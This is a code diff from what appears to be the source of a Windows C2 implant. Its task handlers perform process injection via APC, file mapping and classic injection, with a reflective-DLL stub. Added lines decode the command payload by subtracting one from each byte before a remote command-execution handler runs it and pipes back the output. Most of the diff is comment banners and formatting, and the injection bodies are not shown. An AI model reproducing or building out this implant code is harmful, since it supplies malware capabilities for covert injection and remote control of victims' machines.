@@ -26,6 +26,9 @@ PMESSAGE initAgentId(PBYTE payload, DWORD size)
     return _finishTask("initAgentId", PING_MESSAGE_TYPE);
 };
 
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+                                                                /* INJECTION VIA DLL REFELCTION */
+
 PMESSAGE injectViaDllTask(PBYTE payload, DWORD size)
 {
     /* NEED REFLECTED DLL KNOWNLEDGE */
@@ -33,10 +36,17 @@ PMESSAGE injectViaDllTask(PBYTE payload, DWORD size)
     return _finishTask("injectViaDllTask FAILED", PING_MESSAGE_TYPE);
 };
 
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+                                                                    /* INJECTION VIA APC */
+
 VOID AlertableFunction1() {
     // The 2nd parameter should be 'TRUE'
     SleepEx(INFINITE, TRUE);
 };
+
 PMESSAGE injectViaApcTask(PBYTE payload, DWORD size)
 {
     /*
@@ -100,6 +110,12 @@ PMESSAGE injectViaApcTask(PBYTE payload, DWORD size)
     return _finishTask("injectViaApcTask SUCCESSFUL", PING_MESSAGE_TYPE);
 };
 
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+                                                                    /* INJECTION VIA FILE MAPPING */
+
 PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size)
 {
     /*
@@ -149,6 +165,11 @@ PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size)
     printf("injectViaFileMappingTask SUCCESSFUL\n");
     return _finishTask("injectViaFileMappingTask SUCCESSFUL", PING_MESSAGE_TYPE);
 };
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+                                                                /* INJECTION VIA CLASSIC INJECTION */
 
 PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size)
 {
@@ -203,6 +224,11 @@ PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size)
 
 };
 
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+                                                                /* COMMAND EXECUTION */
+
 PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
 {   
     /*
@@ -213,6 +239,11 @@ PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
     Write end of the other pipe is the standard output for the child process
     Parent process uses the opposite ends of these two pipes to write to the child process's input and read from the child process's output
     */
+   for(int i = 0; i < size; i++)
+   {
+    payload[i] -= 1;
+   }
+   
     HANDLE hChildStd_OUT_Rd = NULL;
     HANDLE hChildStd_OUT_Wr = NULL;
 
@@ -220,8 +251,6 @@ PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
     saAttr.bInheritHandle = TRUE; 
     saAttr.lpSecurityDescriptor = NULL; 
-
-
 
     // Create a pipe for the child process's STDOUT. 
  
@@ -269,7 +298,7 @@ PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
     PBYTE commandOutput[MAX_COMMAND_LINE_OUTPUT_BUFFER_SIZE];
     DWORD bytesRead = 0;
     PMESSAGE messateToReturn;
-    if(!ReadFile(hChildStd_OUT_Rd,commandOutput, MAX_COMMAND_LINE_ARGS_LENGTH, &bytesRead, NULL))
+    if(!ReadFile(hChildStd_OUT_Rd, commandOutput, MAX_COMMAND_LINE_ARGS_LENGTH, &bytesRead, NULL))
     {
         printf("[-] Command execution failed");
         messateToReturn = _finishTask("executeCommandTask FAILED", PING_MESSAGE_TYPE);
@@ -280,3 +309,11 @@ PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
     CloseHandle(hChildStd_OUT_Wr);
     messateToReturn = _finishTask("executeCommandTask SUCCESSFUL", PING_MESSAGE_TYPE);
 }
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
+PMESSAGE listProcess(PBYTE payload, DWORD size)
+{
+    
+}
+
